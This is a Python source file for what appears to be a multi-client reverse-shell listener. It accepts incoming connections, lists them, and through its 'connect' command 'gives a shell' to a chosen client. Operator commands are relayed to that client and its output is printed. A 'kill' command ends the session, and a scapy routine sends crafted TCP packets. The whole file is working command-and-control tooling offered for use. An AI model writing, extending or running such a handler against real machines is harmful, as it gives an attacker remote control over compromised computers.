import socketserver
import sys
import threading
from socket import error as sock_error
from scapy.layers.inet import TCP
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.sendrecv import sendp

LHOST, LPORT = '127.0.0.1', 8080
class TCPHandler(socketserver.BaseRequestHandler):

    def handle(self):
        global _CLEAN
        recvthread = threading.Thread(target=self.recv_message, args=())
        recvthread.start()
        while True:
            try:
                cmd = input()
                if len(cmd) > 0:
                    if "kill" in cmd:
                        self.request.send("1".encode("utf-8"))
                        print('close')
                        recvthread.join()
                    else:
                        self.request.send(cmd.encode("utf-8"))
            except sock_error as e:
                print(e)
                continue

    def recv_message(self):
        while True:
            try:
                data = str(self.request.recv(4096), 'utf-8')
                if data:
                    print("{0}".format(data))
                    if data == "\nClosing connection":
                        print("closed")
                        sys.exit()
            except Exception as e:
                print(e)
                TCPServer(LHOST, LPORT)

#Starts the server and contains the main method
class TCPServer:

    def __init__(self, LHOST, LPORT):
        self.stored_sockets = []
        self.LHOST = LHOST
        self.LPORT= LPORT
        self.server =  socketserver.TCPServer((self.LHOST, self.LPORT), TCPHandler)
        self.check_connections_process = threading.Thread(target=(self.check_for_connections), args=(), daemon=True).start()
        self.main()

    def ping(self, port):
        print("pinging")
        packet = (Ether()/IP(src='127.0.0.1', dst='127.0.0.1')/TCP(sport=8976, dport=port))
        sendp(packet)
        print('sent')

    def main(self):
        command_list = ["help", "list", "connect"]
        print("Type help for a list of commands")
        while True:
            try:
                main_cmd = input("\n>")

                if main_cmd == "list":
                        for i in self.stored_sockets:
                            print(i)

                if main_cmd == 'connect':
                    print("{}\n".format(list(enumerate(self.stored_sockets))))
                    num = int(input("Which connection, choose from list: "))
                    addr, conn = self.stored_sockets[num][0], self.stored_sockets[num][1]
                    self.server.finish_request(conn, addr)

                elif main_cmd == "ping":
                    port = int(input("Which port: "))
                    self.ping(port)

                elif main_cmd == "help":
                    print("list: Shows a list of connected clients\nconnect: Gives a shell to one of the connected clients\n")

            except IndexError and TypeError and ValueError:
                continue

    def check_for_connections(self):
        while True:
            sock_obj, addr = self.server.get_request()
            self.stored_sockets.append([addr, sock_obj])

TCPServer(LHOST, LPORT)